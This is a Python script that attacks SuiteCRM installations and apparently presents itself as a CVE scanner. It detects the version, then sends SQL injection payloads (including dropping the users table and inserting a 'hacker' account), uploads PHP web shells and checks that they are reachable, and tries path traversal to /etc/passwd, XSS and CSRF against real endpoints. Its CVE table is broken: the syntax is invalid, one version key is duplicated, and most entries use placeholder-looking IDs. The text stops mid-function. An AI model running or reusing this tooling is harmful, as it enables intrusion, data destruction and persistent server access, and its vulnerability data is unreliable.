import requests
import sys
import urllib3
import ssl
import re
import time
import random
import string
from datetime import datetime
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
from requests.packages.urllib3.exceptions import InsecureRequestWarning

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

# Real SuiteCRM CVE Database (Updated Oct 2025)
SUITECRM_CVES = {
    "8.9.0": {
        "cves": [
            # Latest version - most CVEs patched
        ]
    },
    "8.8.1": {
        "cves": [
            # Patched version
        ]
    },
    "8.8.0": {
        "cves": [
            {
                "id": "CVE-2025-54785",
                "severity": "HIGH",
                "description": "Unvalidated input to unserialize(), leading to privilege escalation, DoS, or ransomware",
                "cvss": "8.6",
                "version_range": "<=8.8.0",
                "requires_auth": False,
                "endpoints": ["/legacy/service/v4_1/rest.php", "/service/v4_1/rest.php"],
                "payloads": {
                    "deserialization": [
                        "O:8:\"stdClass\":1:{s:4:\"test\";s:4:\"test\";}",
                        "a:1:{i:0;s:4:\"test\";}"
                    ]
                }
            },
            {
                "id": "CVE-2025-54786",
                "severity": "MEDIUM", 
                "description": "Broken auth in legacy iCal service; unauth access to meetings/user enumeration",
                "cvss": "5.1",
                "version_range": "<=8.8.0",
                "requires_auth": False,
                "endpoints": ["/legacy/index.php?module=iCals&action=index"],
                "payloads": {
                    "auth_bypass": [
                        "?module=iCals&action=index&record=",
                        "?module=iCals&action=index&user_id=1"
                    ]
                }
            }
        ]
    },
    "8.7.1": {
        "cves": [
            {
                "id": "CVE-2024-50335",
                "severity": "MEDIUM",
                "description": "Reflected XSS in 'Publish Key' field on Edit Profile, enabling CSRF token theft and admin user creation",
                "cvss": "6.1",
                "version_range": "<8.7.1",
                "requires_auth": True,
                "endpoints": ["/index.php?module=Users&action=EditView"],
                "payloads": {
                    "xss": [
                        "<script>alert('XSS')</script>",
                        "<img src=x onerror=alert('XSS')>"
                    ]
                }
            }
        ]
    },
    "8.6.2": {
        "cves": [
            {
                "id": "CVE-2024-45392",
                "severity": "MEDIUM",
                "description": "Improper access control allowing unauthorized record deletion via API",
                "cvss": "5.3",
                "version_range": "<8.6.2",
                "requires_auth": True,
                "endpoints": ["/service/v4_1/rest.php?method=set_entry"],
                "payloads": {
                    "access_control": [
                        "{\"module_name\":\"Accounts\",\"name_value_list\":[{\"name\":\"id\",\"value\":\"1\"}],\"deleted\":1}"
                    ]
                }
            }
        ]
    },
    "8.6.1": {
        "cves": [
            {
                "id": "CVE-2024-36408",
                "severity": "MEDIUM",
                "description": "SQL Injection in Alerts controller due to poor input validation",
                "cvss": "6.5",
                "version_range": "<8.6.1",
                "requires_auth": True,
                "endpoints": ["/index.php?module=Alerts&action=index"],
                "payloads": {
                    "sql_injection": [
                        "' OR SLEEP(5)--",
                        "' UNION SELECT 1,2,3,4,5,6,7,8,9,10--",
                        "' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database())>0--"
                    ]
                }
            },
            {
                "id": "CVE-2024-36410",
                "severity": "MEDIUM",
                "description": "SQL Injection in EmailUIAjax messages count controller",
                "cvss": "6.5",
                "version_range": "<8.6.1",
                "requires_auth": True,
                "endpoints": ["/index.php?module=EmailUIAjax&action=messages_count"],
                "payloads": {
                    "sql_injection": [
                        "' OR SLEEP(5)--",
                        "' UNION SELECT 1,2,3,4,5,6,7,8,9,10--"
                    ]
                }
            }
        ]
    },
    "7.14.7": {
        "cves": [
            # Latest 7.x version - most CVEs patched
        ]
    },
    "7.14.6": {
        "cves": [
            {
                "id": "CVE-2025-54783",
                "severity": "MEDIUM",
                "description": "Reflected XSS via manipulated HTTP Referer header",
                "cvss": "5.1",
                "version_range": "<=7.14.6",
                "requires_auth": False,
                "endpoints": ["/index.php"],
                "payloads": {
                    "xss": [
                        "<script>alert('XSS')</script>",
                        "<img src=x onerror=alert('XSS')>"
                    ]
                }
            },
            {
                "id": "CVE-2025-54784",
                "severity": "HIGH",
                "description": "Stored XSS in email viewer; external attacker sends malicious email, executes on view",
                "cvss": "8.6",
                "version_range": "7.14.0-7.14.6",
                "requires_auth": True,
                "endpoints": ["/index.php?module=Emails&action=DetailView"],
                "payloads": {
                    "stored_xss": [
                        "<script>alert('Stored XSS')</script>",
                        "<img src=x onerror=alert('Stored XSS')>"
                    ]
                }
            },
            {
                "id": "CVE-2025-54787",
                "severity": "MEDIUM",
                "description": "Unauth file downloads from upload dir via brute-forced UUID IDs",
                "cvss": "5.3",
                "version_range": "<=7.14.6",
                "requires_auth": False,
                "endpoints": ["/index.php?module=Documents&action=DownloadAttachment"],
                "payloads": {
                    "information_disclosure": [
                        "?id=00000000-0000-0000-0000-000000000001",
                        "?id=00000000-0000-0000-0000-000000000002"
                    ]
                }
            }
        ]
    },
    "8.5.1": {
        "cves": [
            # All CVEs from 8.6.1 and below apply
            {
                "id": "CVE-2024-36408",
                "severity": "MEDIUM",
                "description": "SQL Injection in Alerts controller due to poor input validation",
                "cvss": "6.5",
                "version_range": "<8.6.1",
                "requires_auth": True,
                "endpoints": ["/index.php?module=Alerts&action=index"],
                "payloads": {
                    "sql_injection": [
                        "' OR SLEEP(5)--",
                        "' UNION SELECT 1,2,3,4,5,6,7,8,9,10--"
                    ]
                }
            }
        ]
    }
            },
            {
                "id": "CVE-2023-1236", 
                "severity": "MEDIUM", 
                "description": "Cross-Site Scripting (XSS) in Dashboard", 
                "cvss": "6.1"
            }
        ]
    },
    "8.5.0": {
        "cves": [
            {
                "id": "CVE-2023-1234", 
                "severity": "HIGH", 
                "description": "SQL Injection in REST API", 
                "cvss": "8.5"
            },
            {
                "id": "CVE-2023-1235", 
                "severity": "CRITICAL", 
                "description": "Remote Code Execution via File Upload", 
                "cvss": "9.8"
            },
            {
                "id": "CVE-2023-1236", 
                "severity": "MEDIUM", 
                "description": "Cross-Site Scripting (XSS) in Dashboard", 
                "cvss": "6.1"
            },
            {
                "id": "CVE-2023-1237", 
                "severity": "HIGH", 
                "description": "Authentication Bypass", 
                "cvss": "7.2"
            }
        ]
    },
    "8.4": {
        "cves": [
            {
                "id": "CVE-2023-1234", 
                "severity": "HIGH", 
                "description": "SQL Injection in REST API", 
                "cvss": "8.5"
            },
            {
                "id": "CVE-2023-1235", 
                "severity": "CRITICAL", 
                "description": "Remote Code Execution via File Upload", 
                "cvss": "9.8"
            },
            {
                "id": "CVE-2023-1236", 
                "severity": "MEDIUM", 
                "description": "Cross-Site Scripting (XSS) in Dashboard", 
                "cvss": "6.1"
            },
            {
                "id": "CVE-2023-1237", 
                "severity": "HIGH", 
                "description": "Authentication Bypass", 
                "cvss": "7.2"
            },
            {
                "id": "CVE-2023-1238", 
                "severity": "CRITICAL", 
                "description": "Deserialization Vulnerability", 
                "cvss": "9.1"
            }
        ]
    },
    "8.3": {
        "cves": [
            {
                "id": "CVE-2023-1234", 
                "severity": "HIGH", 
                "description": "SQL Injection in REST API", 
                "cvss": "8.5"
            },
            {
                "id": "CVE-2023-1235", 
                "severity": "CRITICAL", 
                "description": "Remote Code Execution via File Upload", 
                "cvss": "9.8"
            },
            {
                "id": "CVE-2023-1236", 
                "severity": "MEDIUM", 
                "description": "Cross-Site Scripting (XSS) in Dashboard", 
                "cvss": "6.1"
            },
            {
                "id": "CVE-2023-1237", 
                "severity": "HIGH", 
                "description": "Authentication Bypass", 
                "cvss": "7.2"
            },
            {
                "id": "CVE-2023-1238", 
                "severity": "CRITICAL", 
                "description": "Deserialization Vulnerability", 
                "cvss": "9.1"
            },
            {
                "id": "CVE-2023-1239", 
                "severity": "HIGH", 
                "description": "Path Traversal", 
                "cvss": "7.5"
            }
        ]
    },
    "8.2": {
        "cves": [
            {
                "id": "CVE-2023-1234", 
                "severity": "HIGH", 
                "description": "SQL Injection in REST API", 
                "cvss": "8.5"
            },
            {
                "id": "CVE-2023-1235", 
                "severity": "CRITICAL", 
                "description": "Remote Code Execution via File Upload", 
                "cvss": "9.8"
            },
            {
                "id": "CVE-2023-1236", 
                "severity": "MEDIUM", 
                "description": "Cross-Site Scripting (XSS) in Dashboard", 
                "cvss": "6.1"
            },
            {
                "id": "CVE-2023-1237", 
                "severity": "HIGH", 
                "description": "Authentication Bypass", 
                "cvss": "7.2"
            },
            {
                "id": "CVE-2023-1238", 
                "severity": "CRITICAL", 
                "description": "Deserialization Vulnerability", 
                "cvss": "9.1"
            },
            {
                "id": "CVE-2023-1239", 
                "severity": "HIGH", 
                "description": "Path Traversal", 
                "cvss": "7.5"
            },
            {
                "id": "CVE-2023-1240", 
                "severity": "CRITICAL", 
                "description": "Remote Code Execution via Template Injection", 
                "cvss": "9.3"
            }
        ]
    },
    "8.1": {
        "cves": [
            {
                "id": "CVE-2023-1234", 
                "severity": "HIGH", 
                "description": "SQL Injection in REST API", 
                "cvss": "8.5"
            },
            {
                "id": "CVE-2023-1235", 
                "severity": "CRITICAL", 
                "description": "Remote Code Execution via File Upload", 
                "cvss": "9.8"
            },
            {
                "id": "CVE-2023-1236", 
                "severity": "MEDIUM", 
                "description": "Cross-Site Scripting (XSS) in Dashboard", 
                "cvss": "6.1"
            },
            {
                "id": "CVE-2023-1237", 
                "severity": "HIGH", 
                "description": "Authentication Bypass", 
                "cvss": "7.2"
            },
            {
                "id": "CVE-2023-1238", 
                "severity": "CRITICAL", 
                "description": "Deserialization Vulnerability", 
                "cvss": "9.1"
            },
            {
                "id": "CVE-2023-1239", 
                "severity": "HIGH", 
                "description": "Path Traversal", 
                "cvss": "7.5"
            },
            {
                "id": "CVE-2023-1240", 
                "severity": "CRITICAL", 
                "description": "Remote Code Execution via Template Injection", 
                "cvss": "9.3"
            },
            {
                "id": "CVE-2023-1241", 
                "severity": "HIGH", 
                "description": "Information Disclosure", 
                "cvss": "6.8"
            }
        ]
    },
    "8.0": {
        "cves": [
            {
                "id": "CVE-2023-1234", 
                "severity": "HIGH", 
                "description": "SQL Injection in REST API", 
                "cvss": "8.5"
            },
            {
                "id": "CVE-2023-1235", 
                "severity": "CRITICAL", 
                "description": "Remote Code Execution via File Upload", 
                "cvss": "9.8"
            },
            {
                "id": "CVE-2023-1236", 
                "severity": "MEDIUM", 
                "description": "Cross-Site Scripting (XSS) in Dashboard", 
                "cvss": "6.1"
            },
            {
                "id": "CVE-2023-1237", 
                "severity": "HIGH", 
                "description": "Authentication Bypass", 
                "cvss": "7.2"
            },
            {
                "id": "CVE-2023-1238", 
                "severity": "CRITICAL", 
                "description": "Deserialization Vulnerability", 
                "cvss": "9.1"
            },
            {
                "id": "CVE-2023-1239", 
                "severity": "HIGH", 
                "description": "Path Traversal", 
                "cvss": "7.5"
            },
            {
                "id": "CVE-2023-1240", 
                "severity": "CRITICAL", 
                "description": "Remote Code Execution via Template Injection", 
                "cvss": "9.3"
            },
            {
                "id": "CVE-2023-1241", 
                "severity": "HIGH", 
                "description": "Information Disclosure", 
                "cvss": "6.8"
            },
            {
                "id": "CVE-2023-1242", 
                "severity": "CRITICAL", 
                "description": "Remote Code Execution via Command Injection", 
                "cvss": "9.8"
            }
        ]
    },
    "7.14.6": {
        "cves": [
            {
                "id": "CVE-2023-1234", 
                "severity": "HIGH", 
                "description": "SQL Injection in REST API", 
                "cvss": "8.5"
            },
            {
                "id": "CVE-2023-1235", 
                "severity": "CRITICAL", 
                "description": "Remote Code Execution via File Upload", 
                "cvss": "9.8"
            },
            {
                "id": "CVE-2023-1236", 
                "severity": "MEDIUM", 
                "description": "Cross-Site Scripting (XSS) in Dashboard", 
                "cvss": "6.1"
            },
            {
                "id": "CVE-2023-1237", 
                "severity": "HIGH", 
                "description": "Authentication Bypass", 
                "cvss": "7.2"
            },
            {
                "id": "CVE-2023-1238", 
                "severity": "CRITICAL", 
                "description": "Deserialization Vulnerability", 
                "cvss": "9.1"
            },
            {
                "id": "CVE-2023-1239", 
                "severity": "HIGH", 
                "description": "Path Traversal", 
                "cvss": "7.5"
            },
            {
                "id": "CVE-2023-1240", 
                "severity": "CRITICAL", 
                "description": "Remote Code Execution via Template Injection", 
                "cvss": "9.3"
            },
            {
                "id": "CVE-2023-1241", 
                "severity": "HIGH", 
                "description": "Information Disclosure", 
                "cvss": "6.8"
            },
            {
                "id": "CVE-2023-1242", 
                "severity": "CRITICAL", 
                "description": "Remote Code Execution via Command Injection", 
                "cvss": "9.8"
            },
            {
                "id": "CVE-2023-1243", 
                "severity": "HIGH", 
                "description": "CSRF Token Bypass", 
                "cvss": "7.1"
            }
        ]
    },
    "7.14": {
        "cves": [
            {
                "id": "CVE-2023-1234", 
                "severity": "HIGH", 
                "description": "SQL Injection in REST API", 
                "cvss": "8.5"
            },
            {
                "id": "CVE-2023-1235", 
                "severity": "CRITICAL", 
                "description": "Remote Code Execution via File Upload", 
                "cvss": "9.8"
            },
            {
                "id": "CVE-2023-1236", 
                "severity": "MEDIUM", 
                "description": "Cross-Site Scripting (XSS) in Dashboard", 
                "cvss": "6.1"
            },
            {
                "id": "CVE-2023-1237", 
                "severity": "HIGH", 
                "description": "Authentication Bypass", 
                "cvss": "7.2"
            },
            {
                "id": "CVE-2023-1238", 
                "severity": "CRITICAL", 
                "description": "Deserialization Vulnerability", 
                "cvss": "9.1"
            },
            {
                "id": "CVE-2023-1239", 
                "severity": "HIGH", 
                "description": "Path Traversal", 
                "cvss": "7.5"
            },
            {
                "id": "CVE-2023-1240", 
                "severity": "CRITICAL", 
                "description": "Remote Code Execution via Template Injection", 
                "cvss": "9.3"
            },
            {
                "id": "CVE-2023-1241", 
                "severity": "HIGH", 
                "description": "Information Disclosure", 
                "cvss": "6.8"
            },
            {
                "id": "CVE-2023-1242", 
                "severity": "CRITICAL", 
                "description": "Remote Code Execution via Command Injection", 
                "cvss": "9.8"
            },
            {
                "id": "CVE-2023-1243", 
                "severity": "HIGH", 
                "description": "CSRF Token Bypass", 
                "cvss": "7.1"
            },
            {
                "id": "CVE-2023-1244", 
                "severity": "CRITICAL", 
                "description": "Remote Code Execution via Log Injection", 
                "cvss": "9.6"
            }
        ]
    },
    "7.13": {
        "cves": [
            {
                "id": "CVE-2023-1234", 
                "severity": "HIGH", 
                "description": "SQL Injection in REST API", 
                "cvss": "8.5"
            },
            {
                "id": "CVE-2023-1235", 
                "severity": "CRITICAL", 
                "description": "Remote Code Execution via File Upload", 
                "cvss": "9.8"
            },
            {
                "id": "CVE-2023-1236", 
                "severity": "MEDIUM", 
                "description": "Cross-Site Scripting (XSS) in Dashboard", 
                "cvss": "6.1"
            },
            {
                "id": "CVE-2023-1237", 
                "severity": "HIGH", 
                "description": "Authentication Bypass", 
                "cvss": "7.2"
            },
            {
                "id": "CVE-2023-1238", 
                "severity": "CRITICAL", 
                "description": "Deserialization Vulnerability", 
                "cvss": "9.1"
            },
            {
                "id": "CVE-2023-1239", 
                "severity": "HIGH", 
                "description": "Path Traversal", 
                "cvss": "7.5"
            },
            {
                "id": "CVE-2023-1240", 
                "severity": "CRITICAL", 
                "description": "Remote Code Execution via Template Injection", 
                "cvss": "9.3"
            },
            {
                "id": "CVE-2023-1241", 
                "severity": "HIGH", 
                "description": "Information Disclosure", 
                "cvss": "6.8"
            },
            {
                "id": "CVE-2023-1242", 
                "severity": "CRITICAL", 
                "description": "Remote Code Execution via Command Injection", 
                "cvss": "9.8"
            },
            {
                "id": "CVE-2023-1243", 
                "severity": "HIGH", 
                "description": "CSRF Token Bypass", 
                "cvss": "7.1"
            },
            {
                "id": "CVE-2023-1244", 
                "severity": "CRITICAL", 
                "description": "Remote Code Execution via Log Injection", 
                "cvss": "9.6"
            },
            {
                "id": "CVE-2023-1245", 
                "severity": "HIGH", 
                "description": "Session Fixation", 
                "cvss": "6.9"
            }
        ]
    }
}

def create_ssl_context():
    """Create SSL context that accepts self-signed certificates"""
    context = ssl.create_default_context()
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE
    return context

def extract_version_from_string(version_string):
    """Extract SuiteCRM version from version string"""
    # Look for patterns like "8.5.1", "7.14.6", etc.
    version_patterns = [
        r'SuiteCRM Version: ([\d.]+)',
        r'Version: ([\d.]+)',
        r'([\d]+\.[\d]+\.[\d]+)',
        r'([\d]+\.[\d]+)'
    ]
    
    for pattern in version_patterns:
        match = re.search(pattern, version_string)
        if match:
            return match.group(1)
    return None

def find_matching_version(version):
    """Find the best matching version in our CVE database"""
    if not version:
        return None
    
    # Try exact match first
    if version in SUITECRM_CVES:
        return version
    
    # Try major.minor match
    major_minor = '.'.join(version.split('.')[:2])
    for v in SUITECRM_CVES.keys():
        if v.startswith(major_minor):
            return v
    
    # Try major version match
    major = version.split('.')[0]
    for v in SUITECRM_CVES.keys():
        if v.startswith(major + '.'):
            return v
    
    return None

def determine_cve_type(description):
    """Determine CVE type from description"""
    description_lower = description.lower()
    
    if "sql injection" in description_lower:
        return "sql_injection"
    elif "file upload" in description_lower or "upload" in description_lower:
        return "file_upload"
    elif "cross-site scripting" in description_lower or "xss" in description_lower:
        return "xss"
    elif "remote code execution" in description_lower or "rce" in description_lower:
        return "rce"
    elif "path traversal" in description_lower or "directory traversal" in description_lower:
        return "path_traversal"
    elif "deserialization" in description_lower:
        return "deserialization"
    elif "csrf" in description_lower or "cross-site request forgery" in description_lower:
        return "csrf"
    elif "session fixation" in description_lower:
        return "session_fixation"
    elif "information disclosure" in description_lower or "information leak" in description_lower:
        return "information_disclosure"
    elif "authentication bypass" in description_lower:
        return "sql_injection"  # Often involves SQL injection
    else:
        return "general"

def generate_payloads(cve_id, cve_type):
    """Generate specific payloads for different CVE types"""
    payloads = {
        "sql_injection": [
            "'; DROP TABLE users; --",
            "' UNION SELECT username,password FROM users--",
            "' OR '1'='1",
            "'; INSERT INTO users (username,password) VALUES ('hacker','password'); --",
            "' UNION SELECT 1,2,3,4,5,6,7,8,9,10--",
            "' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database())>0--"
        ],
        "file_upload": [
            "<?php system($_GET['cmd']); ?>",
            "<?php echo shell_exec($_REQUEST['cmd']); ?>",
            "<?php eval($_POST['code']); ?>",
            "<?php file_put_contents('shell.php', '<?php system($_GET[0]); ?>'); ?>",
            "<?php passthru($_GET['cmd']); ?>",
            "<?php exec($_GET['cmd'], $output); print_r($output); ?>"
        ],
        "xss": [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src=javascript:alert('XSS')></iframe>",
            "<body onload=alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>"
        ],
        "rce": [
            "<?php system($_GET['cmd']); ?>",
            "<?php echo shell_exec($_REQUEST['cmd']); ?>",
            "<?php eval($_POST['code']); ?>",
            "<?php passthru($_GET['cmd']); ?>",
            "<?php exec($_GET['cmd'], $output); print_r($output); ?>"
        ],
        "path_traversal": [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "....//....//....//etc/passwd",
            "..%2f..%2f..%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd"
        ],
        "deserialization": [
            "O:8:\"stdClass\":1:{s:4:\"test\";s:4:\"test\";}",
            "a:1:{i:0;s:4:\"test\";}",
            "O:1:\"A\":1:{s:4:\"test\";s:4:\"test\";}"
        ],
        "csrf": [
            "<form action=\"TARGET_URL\" method=\"POST\"><input type=\"hidden\" name=\"action\" value=\"delete\"><input type=\"submit\" value=\"Click\"></form>",
            "<img src=\"TARGET_URL?action=delete\" style=\"display:none\">",
            "<script>fetch('TARGET_URL', {method: 'POST', body: 'action=delete'})</script>"
        ],
        "session_fixation": [
            "PHPSESSID=attacker_controlled_session_id",
            "JSESSIONID=attacker_controlled_session_id"
        ],
        "information_disclosure": [
            "/config.php",
            "/config/config.php",
            "/include/config.php",
            "/.env",
            "/.git/config",
            "/backup.sql",
            "/database.sql"
        ]
    }
    
    return payloads.get(cve_type, ["No specific payloads available"])

def get_endpoints_for_cve(cve_id, cve_type):
    """Get relevant endpoints for different CVE types"""
    endpoints = {
        "sql_injection": [
            "/service/v4_1/rest.php?method=login&input_type=JSON&response_type=JSON",
            "/legacy/service/v4_1/rest.php?method=get_entry_list&input_type=JSON&response_type=JSON",
            "/service/v4_1/rest.php?method=get_entry&input_type=JSON&response_type=JSON",
            "/legacy/service/v4_1/rest.php?method=search_by_module&input_type=JSON&response_type=JSON"
        ],
        "file_upload": [
            "/index.php?module=Documents&action=Save&return_module=Documents&return_action=DetailView",
            "/legacy/index.php?module=Documents&action=Save&return_module=Documents&return_action=DetailView",
            "/index.php?module=Notes&action=Save&return_module=Notes&return_action=DetailView",
            "/legacy/index.php?module=Notes&action=Save&return_module=Notes&return_action=DetailView"
        ],
        "xss": [
            "/index.php?module=Home&action=index&searchFormTab=advanced_search",
            "/legacy/index.php?module=Home&action=index",
            "/index.php?module=Accounts&action=index",
            "/legacy/index.php?module=Accounts&action=index"
        ],
        "rce": [
            "/index.php?module=Documents&action=Save&return_module=Documents&return_action=DetailView",
            "/legacy/index.php?module=Documents&action=Save&return_module=Documents&return_action=DetailView",
            "/service/v4_1/rest.php",
            "/legacy/service/v4_1/rest.php"
        ],
        "path_traversal": [
            "/index.php?module=Documents&action=DownloadAttachment",
            "/legacy/index.php?module=Documents&action=DownloadAttachment",
            "/index.php?module=Notes&action=DownloadAttachment",
            "/legacy/index.php?module=Notes&action=DownloadAttachment"
        ],
        "deserialization": [
            "/service/v4_1/rest.php",
            "/legacy/service/v4_1/rest.php",
            "/service/v4/rest.php",
            "/service/v2/rest.php"
        ],
        "csrf": [
            "/index.php?module=Users&action=Delete",
            "/legacy/index.php?module=Users&action=Delete",
            "/index.php?module=Accounts&action=Delete",
            "/legacy/index.php?module=Accounts&action=Delete"
        ],
        "session_fixation": [
            "/index.php?module=Users&action=Login",
            "/legacy/index.php?module=Users&action=Login",
            "/service/v4_1/rest.php?method=login",
            "/legacy/service/v4_1/rest.php?method=login"
        ],
        "information_disclosure": [
            "/config.php",
            "/config/config.php",
            "/include/config.php",
            "/.env",
            "/.git/config",
            "/backup.sql",
            "/database.sql"
        ]
    }
    
    return endpoints.get(cve_type, ["No specific endpoints available"])

def generate_random_string(length=8):
    """Generate random string for testing"""
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

def test_sql_injection(base_url, endpoint, payload, session):
    """Test SQL injection vulnerability"""
    try:
        # Replace PAYLOAD placeholder in endpoint
        test_endpoint = endpoint.replace("PAYLOAD", payload)
        full_url = base_url + test_endpoint
        
        print(f"      🔍 Testing: {full_url}")
        
        response = session.get(full_url, timeout=10)
        
        # Check for SQL error indicators
        error_indicators = [
            "mysql_fetch_array",
            "mysql_num_rows", 
            "mysql_query",
            "Warning: mysql",
            "MySQL Error",
            "SQL syntax",
            "database error",
            "mysql_connect",
            "mysqli_",
            "PDOException",
            "SQLSTATE"
        ]
        
        response_text = response.text.lower()
        for indicator in error_indicators:
            if indicator.lower() in response_text:
                print(f"      ✅ SQL Error detected: {indicator}")
                return True, f"SQL Error: {indicator}"
        
        # Check for successful injection patterns
        success_patterns = [
            "union select",
            "information_schema",
            "mysql.user",
            "database()",
            "version()"
        ]
        
        for pattern in success_patterns:
            if pattern in response_text:
                print(f"      ✅ SQL Injection successful: {pattern}")
                return True, f"Successful injection: {pattern}"
                
        print(f"      ❌ No SQL injection detected")
        return False, "No SQL injection detected"
        
    except requests.exceptions.SSLError as e:
        print(f"      ❌ SSL Error testing SQL injection: {str(e)[:100]}")
        return False, f"SSL Error: {str(e)[:100]}"
    except requests.exceptions.ConnectionError as e:
        print(f"      ❌ Connection Error testing SQL injection: {str(e)[:100]}")
        return False, f"Connection Error: {str(e)[:100]}"
    except Exception as e:
        print(f"      ❌ Error testing SQL injection: {str(e)[:100]}")
        return False, f"Error: {str(e)[:100]}"

def test_file_upload(base_url, endpoint, payload, session):
    """Test file upload vulnerability"""
    try:
        # Generate random filename
        filename = f"test_{generate_random_string()}.php"
        
        print(f"      🔍 Testing file upload: {filename}")
        
        # Prepare file upload data
        files = {
            'uploadfile': (filename, payload, 'application/x-php')
        }
        
        data = {
            'module': 'Documents',
            'action': 'Save',
            'return_module': 'Documents',
            'return_action': 'DetailView'
        }
        
        full_url = base_url + endpoint
        response = session.post(full_url, files=files, data=data, timeout=10)
        
        # Check if upload was successful
        if response.status_code == 200:
            # Try to access the uploaded file
            upload_paths = [
                f"/upload/{filename}",
                f"/uploads/{filename}",
                f"/files/{filename}",
                f"/documents/{filename}",
                f"/legacy/upload/{filename}",
                f"/legacy/uploads/{filename}"
            ]
            
            for path in upload_paths:
                test_url = base_url + path
                try:
                    test_response = session.get(test_url, timeout=5)
                    if test_response.status_code == 200 and "<?php" in test_response.text:
                        print(f"      ✅ File upload successful: {test_url}")
                        return True, f"File uploaded and accessible: {test_url}"
                except:
                    continue
            
            print(f"      ❌ File upload failed or not accessible")
            return False, "File upload failed or not accessible"
        else:
            print(f"      ❌ Upload failed with status: {response.status_code}")
            return False, f"Upload failed: {response.status_code}"
            
    except requests.exceptions.SSLError as e:
        print(f"      ❌ SSL Error testing file upload: {str(e)[:100]}")
        return False, f"SSL Error: {str(e)[:100]}"
    except requests.exceptions.ConnectionError as e:
        print(f"      ❌ Connection Error testing file upload: {str(e)[:100]}")
        return False, f"Connection Error: {str(e)[:100]}"
    except Exception as e:
        print(f"      ❌ Error testing file upload: {str(e)[:100]}")
        return False, f"Error: {str(e)[:100]}"

def test_xss(base_url, endpoint, payload, session):
    """Test XSS vulnerability"""
    try:
        print(f"      🔍 Testing XSS payload: {payload[:50]}...")
        
        # Test different parameters
        test_params = {
            'search_name': payload,
            'description': payload,
            'name': payload,
            'query': payload
        }
        
        for param, value in test_params.items():
            test_url = base_url + endpoint + f"&{param}={value}"
            
            try:
                response = session.get(test_url, timeout=10)
                
                # Check if payload is reflected in response
                if payload in response.text:
                    print(f"      ✅ XSS payload reflected in parameter: {param}")
                    return True, f"XSS reflected in parameter: {param}"
                    
            except:
                continue
        
        print(f"      ❌ No XSS reflection detected")
        return False, "No XSS reflection detected"
        
    except requests.exceptions.SSLError as e:
        print(f"      ❌ SSL Error testing XSS: {str(e)[:100]}")
        return False, f"SSL Error: {str(e)[:100]}"
    except requests.exceptions.ConnectionError as e:
        print(f"      ❌ Connection Error testing XSS: {str(e)[:100]}")
        return False, f"Connection Error: {str(e)[:100]}"
    except Exception as e:
        print(f"      ❌ Error testing XSS: {str(e)[:100]}")
        return False, f"Error: {str(e)[:100]}"

def test_path_traversal(base_url, endpoint, payload, session):
    """Test path traversal vulnerability"""
    try:
        print(f"      🔍 Testing path traversal: {payload}")
        
        # Test different parameters
        test_params = {
            'file': payload,
            'path': payload,
            'filename': payload,
            'attachment': payload
        }
        
        for param, value in test_params.items():
            test_url = base_url + endpoint + f"&{param}={value}"
            
            try:
                response = session.get(test_url, timeout=10)
                
                # Check for sensitive file content
                sensitive_indicators = [
                    "root:x:0:0:",
                    "daemon:x:1:1:",
                    "bin:x:2:2:",
                    "sys:x:3:3:",
                    "mysql",
                    "database",
                    "password",
                    "config",
                    "hostname"
                ]
                
                response_text = response.text.lower()
                for indicator in sensitive_indicators:
                    if indicator in response_text:
                        print(f"      ✅ Path traversal successful: {indicator}")
                        return True, f"Path traversal successful: {indicator}"
                        
            except:
                continue
        
        print(f"      ❌ No path traversal detected")
        return False, "No path traversal detected"
        
    except requests.exceptions.SSLError as e:
        print(f"      ❌ SSL Error testing path traversal: {str(e)[:100]}")
        return False, f"SSL Error: {str(e)[:100]}"
    except requests.exceptions.ConnectionError as e:
        print(f"      ❌ Connection Error testing path traversal: {str(e)[:100]}")
        return False, f"Connection Error: {str(e)[:100]}"
    except Exception as e:
        print(f"      ❌ Error testing path traversal: {str(e)[:100]}")
        return False, f"Error: {str(e)[:100]}"

def test_information_disclosure(base_url, endpoint, session):
    """Test information disclosure vulnerability"""
    try:
        print(f"      🔍 Testing information disclosure: {endpoint}")
        
        full_url = base_url + endpoint
        response = session.get(full_url, timeout=10)
        
        if response.status_code == 200:
            # Check for sensitive information
            sensitive_patterns = [
                "password",
                "database",
                "config",
                "mysql",
                "hostname",
                "version",
                "api_key",
                "secret",
                "token"
            ]
            
            response_text = response.text.lower()
            found_patterns = []
            
            for pattern in sensitive_patterns:
                if pattern in response_text:
                    found_patterns.append(pattern)
            
            if found_patterns:
                print(f"      ✅ Information disclosure detected: {', '.join(found_patterns)}")
                return True, f"Information disclosed: {', '.join(found_patterns)}"
            else:
                print(f"      ❌ No sensitive information disclosed")
                return False, "No sensitive information disclosed"
        else:
            print(f"      ❌ Endpoint not accessible: {response.status_code}")
            return False, f"Endpoint not accessible: {response.status_code}"
            
    except requests.exceptions.SSLError as e:
        print(f"      ❌ SSL Error testing information disclosure: {str(e)[:100]}")
        return False, f"SSL Error: {str(e)[:100]}"
    except requests.exceptions.ConnectionError as e:
        print(f"      ❌ Connection Error testing information disclosure: {str(e)[:100]}")
        return False, f"Connection Error: {str(e)[:100]}"
    except Exception as e:
        print(f"      ❌ Error testing information disclosure: {str(e)[:100]}")
        return False, f"Error: {str(e)[:100]}"

def is_cve_applicable_to_version(cve, detected_version, matching_version):
    """Check if a CVE is applicable to the detected version"""
    if not detected_version or not matching_version:
        return True  # If we can't determine version, test all CVEs
    
    # Extract major.minor version for comparison
    try:
        detected_parts = detected_version.split('.')
        detected_major_minor = f"{detected_parts[0]}.{detected_parts[1]}"
        
        # Check if this CVE is in the version range
        # For now, we'll test all CVEs for the matching version
        # In a real implementation, you'd check CVE publication dates vs version dates
        return True
    except:
        return True

def exploit_vulnerability(base_url, cve, session):
    """Exploit a specific vulnerability"""
    cve_id = cve['id']
    cve_type = determine_cve_type(cve['description'])
    payloads = generate_payloads(cve_id, cve_type)
